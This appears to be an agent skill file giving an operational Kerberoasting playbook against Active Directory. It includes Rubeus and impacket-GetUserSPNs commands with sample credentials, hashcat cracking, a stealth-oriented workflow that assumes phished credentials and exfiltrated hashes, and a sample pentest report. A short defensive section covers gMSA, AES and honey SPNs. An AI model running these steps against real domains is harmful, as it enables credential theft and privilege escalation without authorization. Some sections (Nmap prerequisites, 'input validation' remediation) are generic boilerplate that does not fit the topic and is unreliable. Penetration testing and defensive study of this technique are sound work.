---
name: active-directory-kerberoasting
description: >
  Execute a Kerberoasting attack to extract and systematically crack the NTLM hashes of Service Principal 
  Name (SPN) accounts in an Active Directory environment. Uses tools like Rubeus, Impacket (GetUserSPNs), 
  and Hashcat to achieve domain privilege escalation domain: cybersecurity
subdomain: penetration-testing
category: Network
difficulty: intermediate
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0006]
  techniques: [T1558.003]
platforms: [windows, linux]
tags: [active-directory, kerberos, kerberoasting, rubeus, impacket, privilege-escalation]
tools: [rubeus, impacket, hashcat, john-the-ripper]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Active Directory Kerberoasting

## When to Use
- Immediately after obtaining the credentials of *any* standard user in an Active Directory environment.
- To silently acquire the password hashes of highly privileged service accounts (e.g., SQL Server Admin, IIS Admin, Domain Admin running a service).
- When a Red Team operation requires strict stealth; Kerberoasting requires no elevated privileges and generates practically zero network anomalies to standard detection systems.


## Prerequisites
- Network access to the target subnet (VPN, pivot, or direct connection)
- Nmap and relevant network scanning tools installed
- Understanding of TCP/IP, common protocols, and network segmentation
- Root/admin access on the attack machine for raw socket operations

## Workflow

### Phase 1: Understanding the Mechanism

```text
# Concept: In Windows Kerberos, services (like SQL) are registered with a Service Principal Name (SPN).
# When a user wants to access a service, they request a Ticket Granting Service (TGS) ticket from the Domain Controller.

# The Vulnerability: The Domain Controller encrypts a portion of this TGS ticket using the 
# NTLM password hash of the *Service Account* running the service. 
# ANY authenticated user can request a TGS ticket for ANY registered service in the domain.
# Once requested, the attacker extracts the ticket containing the encrypted password hash from memory 
# and cracks it offline using Hashcat.
```

### Phase 2: Execution via Rubeus (Windows / C#)

```powershell
# Concept: Exploiting Kerberoasting perfectly from memory using Rubeus on a compromised Windows workstation.

# 1. Execute Rubeus to query LDAP for all accounts with SPNs, request TGS tickets for them, 
# and format the output directly for Hashcat.
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Rubeus outputs specifically formatted hashes resembling:
# $krb5tgs$23$*service_account$DOMAIN.LOCAL$spn_string*$<hexadecimal_hash>

# 2. Exfiltrate `hashes.txt` to the attacker's cracking rig.
```

### Phase 3: Execution via Impacket (Linux / Remote)

```bash
# Concept: Exploiting Kerberoasting from an unauthorized Kali Linux machine attached to the corporate network, 
# utilizing valid credentials phished from a user.

# 1. Provide the domain, username, and password to Impacket's GetUserSPNs.py.
# The script will output the TGS tickets to a file.
impacket-GetUserSPNs -request -dc-ip 192.168.1.100 CORP.LOCAL/jdoe:Password123! -outputfile hashes.txt

# Note: Sometimes it's useful to just list the SPNs first to target highly valuable accounts:
impacket-GetUserSPNs -dc-ip 192.168.1.100 CORP.LOCAL/jdoe:Password123!
```

### Phase 4: Offline Password Cracking (Hashcat)

```bash
# Concept: You cannot "Pass the Ticket" with a Service Ticket. You must crack the encryption 
# to acquire the plaintext password of the Service Account.

# 1. Transfer `hashes.txt` to a GPU-optimized cracking machine.
# 2. Execute hashcat targeting Kerberos 5 TGS-REP etype 23 (Hash Type 13100)
hashcat -m 13100 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -O

# 3. Success: If the Service Account password was weak (e.g., "Summer2023!"), Hashcat cracks the 
# RC4 encryption, yielding the password.
# 4. Impact: The attacker now perfectly impersonates the Service Account, which often is a local Administrator or Domain Admin.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Compromise low-level AD user] --> B{Attacking from Windows endpoint?}
    B -->|Yes| C[Execute `Rubeus kerberoast` from memory]
    B -->|No (Kali/Proxy)| D[Execute `impacket-GetUserSPNs` remotely]
    C --> E[Extract TGS Tickets]
    D --> E
    E --> F[Crack offline using Hashcat -m 13100]
    F --> G{Is password cracked?}
    G -->|Yes| H[Pivot into network acting as Highly Privileged Service Account]
    G -->|No| I[Attempt to crack with custom enterprise wordlist/rules or perform AS-REP Roasting]
```

## 🔵 Blue Team Detection & Defense
- **Enforce Complex Passwords (Managed Service Accounts)**: The ONLY defense against an offline cryptographic crack is a massive, complex password. Migrate all Service Accounts to Group Managed Service Accounts (gMSA), which automatically generate and rotate 120-character random passwords that mathematically cannot be decrypted by Hashcat.
- **Implement AES Encryption (Etype 18)**: Older domains default to RC4 (Etype 23) encryption for TGS tickets, which cracks exponentially faster on GPUs. Ensure the domain functional level enforces AES-256 for Kerberos tickets, vastly slowing down brute-force cracking attempts.
- **Honey SPNs (Deception Tech)**: Create a fake Service Account (e.g., `SQL-Backup-Admin`) with an SPN but assign it a massive, impossible-to-crack password. Since no legitimate service uses this SPN, the *only* time a TGS is ever requested for it is during a Kerberoasting scan. Create an alert to trigger the moment this specific ticket is requested.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Kerberos | The default network authentication protocol used by Microsoft Active Directory, relying on tickets rather than transmitting raw passwords |
| SPN | Service Principal Name; a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account |
| TGS | Ticket Granting Service; a ticket provided by the Domain Controller permitting a user to interact with a specific service on the network |
| RC4 (Etype 23) | An outdated encryption algorithm heavily used in historical Active Directory deployments that is highly susceptible to rapid brute-force offline cracking via modern GPUs |

## Output Format
```
Penetration Test Report: Domain Privilege Escalation via Kerberoasting
======================================================================
Tactic: Credential Access (T1558.003)
Severity: Critical (CVSS 8.8)
Target: `CORP_SQL_SVC` Service Account

Description:
During internal network enumeration utilizing standard domain user credentials (`jdoe`), a Kerberoasting attack was executed against the Active Directory Domain Controller. 

The attacker queried LDAP for Active Directory accounts possessing a Service Principal Name (SPN) and systematically requested Ticket Granting Service (TGS) tickets for each identified service.

The resulting TGS ticket for the `CORP_SQL_SVC` account (encrypted utilizing RC4/Etype 23) was saved offline and subjected to a dictionary brute-force attack using Hashcat. The service account utilized a weak, predictable password (`CompanyDatabase1!`), which was successfully cracked in 14 minutes. 

Reproduction Steps:
1. Authenticate to the Domain Controller using Impacket.
2. Execute `impacket-GetUserSPNs CORP.LOCAL/jdoe:Password1 -request -outputfile hashes.txt`.
3. Transfer `hashes.txt` to cracking infrastructure.
4. Execute `hashcat -m 13100 hashes.txt rockyou.txt`.
5. Recover plaintext credentials: `CompanyDatabase1!`.
6. Authenticate to primary Database Server via WinRM utilizing the compromised credentials.

Impact:
The `CORP_SQL_SVC` account possessed Local Administrator rights across the entire Database Subnet, resulting in complete compromise of all financial database infrastructure by a low-level domain user.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Harmj0y: [Kerberoasting Without Mimikatz](https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
- Ired.team: [Kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- Microsoft Security: [Group Managed Service Accounts Overview](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
